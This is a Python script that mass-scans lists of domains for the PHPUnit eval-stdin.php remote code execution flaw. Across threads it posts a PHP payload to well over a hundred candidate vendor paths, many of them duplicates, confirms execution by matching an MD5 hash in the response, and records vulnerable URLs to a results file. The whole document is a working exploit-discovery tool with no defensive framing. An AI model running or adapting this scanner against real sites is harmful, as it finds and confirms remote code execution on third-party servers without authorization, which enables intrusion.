import os
import requests
from sys import argv
from colorama import Fore, Style
import threading

phpfiles = [
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/asset/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/dist/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/plugin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/dashboard/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/administrator/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/home/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/bower/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/data/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/vendors/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/local/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/shop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wp-content/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/inc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/libs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/application/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/sys/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/src/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/plugins/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/ext/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/webroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/shared/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wwwroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/uploads/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/media/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cgi-bin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/tools/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/scripts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/plugins/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/libs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/ext/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/application/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/webroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/shared/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wwwroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/uploads/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/media/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cgi-bin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/data/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/tools/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/scripts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/plugins/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/libs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/ext/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/application/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/webroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/shared/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wwwroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/uploads/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/media/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cgi-bin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/data/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/tools/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/scripts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/plugins/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/libs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/ext/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/application/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/webroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/shared/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wwwroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/uploads/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/media/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cgi-bin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/data/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/tools/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/scripts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/temp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/plugins/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/libs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/ext/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/application/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/webroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/shared/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wwwroot/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/uploads/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/media/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cgi-bin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/data/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/tools/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/scripts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/includes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/application/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/dashboards/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/shop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/author/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/index/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/main/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        ]

def check_vuln(site):
    try:
        for i in phpfiles:
            site_to_check = site + i
            req = requests.get(site_to_check, headers={
                "Content-Type": "text/html",
                "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            }, data="<?php echo md5(anonre); ?>")
            if "90ef027097e123b577efd0f3b817d5b5" in req.text:
                print(f"{Fore.GREEN}Vulnerable Bos > {site_to_check}{Style.RESET_ALL}")
                save_vulnerable(site_to_check)
                return site_to_check
        print(f"{Fore.RED}Not vulnerable Bos > {site}{Style.RESET_ALL}")
        return False
    except:
        return False

def save_vulnerable(site):
    results_folder = "results"
    if not os.path.exists(results_folder):
        os.makedirs(results_folder)
    with open(os.path.join(results_folder, "vuln.txt"), "a") as file:
        file.write(site + "\n")

def check_domains(domain_list, num_threads=10):
    threads = []
    for domain in domain_list:
        domain = domain.strip()
        if not domain.startswith("http"):
            domain = "http://" + domain
        while threading.active_count() > num_threads:
            pass
        thread = threading.Thread(target=check_vuln, args=(domain,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

def help():
    exit(f"{argv[0]} <file_with_domains> <num_threads>")

def main():
    if len(argv) < 3:
        help()
    
    file_with_domains = argv[1]
    num_threads = int(argv[2])

    try:
        with open(file_with_domains, 'r') as file:
            domains = file.readlines()
            check_domains(domains, num_threads)
    except FileNotFoundError:
        exit(f"File '{file_with_domains}' not found.")

if __name__ == "__main__":
    main()
